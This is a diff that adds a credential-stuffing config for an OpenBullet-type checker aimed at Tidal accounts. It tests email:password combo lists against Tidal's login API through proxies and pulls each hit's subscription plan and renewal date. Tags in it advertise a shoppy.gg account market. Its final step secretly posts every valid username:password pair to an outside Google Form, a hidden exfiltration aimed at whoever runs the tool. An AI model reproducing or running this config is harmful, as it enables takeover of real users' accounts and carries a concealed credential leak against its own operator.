@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "Tidal By-IpProxeis",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-21T01:15:30.5907019+02:00",
+  "AdditionalInfo": "",
+  "Author": "IpProxeis",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.tidal.com/v1/login/username" AutoRedirect=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&token=eM5XROfRd91xUPAJ&clientUniqueKey=28e26790b9d5d173&clientVersion=2.12.2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: TIDAL_ANDROID/920 okhttp/3.13.1" 
+
+#chack KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"userId\"" 
+  KEYCHAIN Failure OR 
+    KEY "password cannot be blank" 
+    KEY "Username or password is wrong" 
+
+#ID PARSE "<SOURCE>" LR "\"userId\":" "," -> VAR "ID" 
+
+#SessionID PARSE "<SOURCE>" JSON "sessionId" -> VAR "sessionID" 
+
+#https://shoppy.gg/@IpMarket PARSE "<SOURCE>" JSON "countryCode" -> CAP "Country" 
+
+#Get_Data REQUEST GET "https://api.tidalhifi.com/v1/users/<ID>/subscription?sessionId=<sessionID>&countryCode=<Country>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api.tidalhifi.com" 
+  HEADER "Referer: https://api.tidalhifi.com" 
+
+#chack_again KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"premiumAccess\":false" 
+
+#https://shoppy.gg/@IpMarket PARSE "<SOURCE>" LR "type\":\"" "\"" -> CAP "Plan" 
+
+#https://shoppy.gg/@IpMarket PARSE "<SOURCE>" LR "\"validUntil\":\"" "T" -> CAP "Renew" "" " By-IpProxeis" 
+
+#IpProxies#2455 REQUEST GET "https://docs.google.com/forms/d/1KGyfLamIU730wn49X3ZmAnz6IpcDVoQrj0TG0hONnks/viewform" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Kaptura REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLSfDLTQ0e2ykqHKk7IyxqjZKOS-dxJdnnouh85g_MS4e0CKEUg/formResponse" 
+  CONTENT "entry.2079091153=Tidal&entry.1130329574=<USER>:<PASS>&entry.1093332025=|Plan:<Plan>|Next Billing:<Next Billing>|&fvv=1&draftResponse=%5Bnull%2Cnull%2C%22-1992003929253000364%22%5D%0D%0A&pageHistory=0&fbzx=-1992003929253000364" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+
+
